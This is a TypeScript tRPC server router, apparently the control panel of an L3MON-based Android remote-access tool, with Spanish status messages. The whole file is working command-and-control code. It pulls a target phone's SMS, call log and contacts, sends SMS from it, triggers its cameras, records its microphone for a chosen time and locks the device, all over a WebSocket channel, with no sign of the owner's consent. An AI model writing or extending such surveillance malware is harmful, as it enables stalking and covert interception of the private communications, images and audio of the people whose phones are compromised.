import { router, protectedProcedure } from "../_core/trpc";
import { z } from "zod";
import { TRPCError } from "@trpc/server";

/**
 * Communications Router — Platinum Phase 3
 * Handles SMS, Calls (Call Log), Contacts, and Clipboard via L3MON WebSocket protocol.
 */
export const communicationsRouter = router({
  // ─── SMS ─────────────────────────────────────────────────────────────────────
  getSMS: protectedProcedure
    .input(z.object({ deviceId: z.number() }))
    .query(async ({ input }) => {
      const { getWebSocketManager } = await import("../websocket");
      const wsManager = getWebSocketManager();
      if (!wsManager) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "WebSocket no disponible" });

      // Request SMS list from device (0xSM)
      wsManager.broadcastToDevice(input.deviceId, "execute-command", {
        action: "get-sms",
        payload: {}
      });

      // Wait up to 8 seconds for device response via EventBus
      const { eventBus } = await import("../eventBus");
      try {
        const response = await new Promise<any>((resolve, reject) => {
          const timeout = setTimeout(() => reject(new Error("Timeout")), 8000);
          eventBus.once(`sms-response-${input.deviceId}`, (data) => {
            clearTimeout(timeout);
            resolve(data);
          });
        });
        return { messages: response.messages || [], timestamp: new Date() };
      } catch {
        return { messages: [], timestamp: new Date(), note: "Dispositivo sin respuesta" };
      }
    }),

  sendSMS: protectedProcedure
    .input(z.object({ deviceId: z.number(), to: z.string(), message: z.string() }))
    .mutation(async ({ input }) => {
      const { getWebSocketManager } = await import("../websocket");
      const wsManager = getWebSocketManager();
      if (!wsManager) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "WebSocket no disponible" });
      wsManager.broadcastToDevice(input.deviceId, "execute-command", {
        action: "send-sms",
        payload: { to: input.to, sms: input.message }
      });
      return { success: true, timestamp: new Date() };
    }),

  // ─── CALLS ───────────────────────────────────────────────────────────────────
  getCalls: protectedProcedure
    .input(z.object({ deviceId: z.number() }))
    .query(async ({ input }) => {
      const { getWebSocketManager } = await import("../websocket");
      const wsManager = getWebSocketManager();
      if (!wsManager) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "WebSocket no disponible" });

      // Request call log from device (0xCL)
      wsManager.broadcastToDevice(input.deviceId, "execute-command", {
        action: "get-calls",
        payload: {}
      });

      const { eventBus } = await import("../eventBus");
      try {
        const response = await new Promise<any>((resolve, reject) => {
          const timeout = setTimeout(() => reject(new Error("Timeout")), 8000);
          eventBus.once(`calls-response-${input.deviceId}`, (data) => {
            clearTimeout(timeout);
            resolve(data);
          });
        });
        return { calls: response.calls || [], timestamp: new Date() };
      } catch {
        return { calls: [], timestamp: new Date(), note: "Dispositivo sin respuesta" };
      }
    }),

  // ─── CONTACTS ────────────────────────────────────────────────────────────────
  getContacts: protectedProcedure
    .input(z.object({ deviceId: z.number() }))
    .query(async ({ input }) => {
      const { getWebSocketManager } = await import("../websocket");
      const wsManager = getWebSocketManager();
      if (!wsManager) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "WebSocket no disponible" });

      // Request contacts from device (0xCO)
      wsManager.broadcastToDevice(input.deviceId, "execute-command", {
        action: "get-contacts",
        payload: {}
      });

      const { eventBus } = await import("../eventBus");
      try {
        const response = await new Promise<any>((resolve, reject) => {
          const timeout = setTimeout(() => reject(new Error("Timeout")), 8000);
          eventBus.once(`contacts-response-${input.deviceId}`, (data) => {
            clearTimeout(timeout);
            resolve(data);
          });
        });
        return { contacts: response.contacts || [], timestamp: new Date() };
      } catch {
        return { contacts: [], timestamp: new Date(), note: "Dispositivo sin respuesta" };
      }
    }),

  // ─── CAMERA ──────────────────────────────────────────────────────────────────
  triggerCamera: protectedProcedure
    .input(z.object({ deviceId: z.number(), camera: z.enum(["front", "back"]).default("back") }))
    .mutation(async ({ input }) => {
      const { getWebSocketManager } = await import("../websocket");
      const wsManager = getWebSocketManager();
      if (!wsManager) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "WebSocket no disponible" });
      wsManager.broadcastToDevice(input.deviceId, "execute-command", {
        action: "get-camera",
        payload: { camera: input.camera === "front" ? 1 : 0 }
      });
      return { success: true, message: `Cámara ${input.camera === "front" ? "delantera" : "trasera"} activada`, timestamp: new Date() };
    }),

  // ─── VIBRATE ─────────────────────────────────────────────────────────────────
  vibrate: protectedProcedure
    .input(z.object({ deviceId: z.number(), duration: z.number().default(1000) }))
    .mutation(async ({ input }) => {
      const { getWebSocketManager } = await import("../websocket");
      const wsManager = getWebSocketManager();
      if (!wsManager) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "WebSocket no disponible" });
      wsManager.broadcastToDevice(input.deviceId, "execute-command", {
        action: "vibrate",
        payload: { duration: input.duration }
      });
      return { success: true, timestamp: new Date() };
    }),

  // ─── LOCK DEVICE ─────────────────────────────────────────────────────────────
  lockDevice: protectedProcedure
    .input(z.object({ deviceId: z.number() }))
    .mutation(async ({ input }) => {
      const { getWebSocketManager } = await import("../websocket");
      const wsManager = getWebSocketManager();
      if (!wsManager) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "WebSocket no disponible" });
      wsManager.broadcastToDevice(input.deviceId, "execute-command", {
        action: "lock_device",
        payload: {}
      });
      return { success: true, timestamp: new Date() };
    }),

  // ─── MICROPHONE ──────────────────────────────────────────────────────────────
  recordMicrophone: protectedProcedure
    .input(z.object({ deviceId: z.number(), seconds: z.number().default(60) }))
    .mutation(async ({ input }) => {
      const { getWebSocketManager } = await import("../websocket");
      const wsManager = getWebSocketManager();
      if (!wsManager) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "WebSocket no disponible" });
      wsManager.broadcastToDevice(input.deviceId, "execute-command", {
        action: "start_audio_recording",
        payload: { sec: input.seconds }
      });
      return { success: true, message: `Grabación de micrófono iniciada (${input.seconds}s)`, timestamp: new Date() };
    }),
});
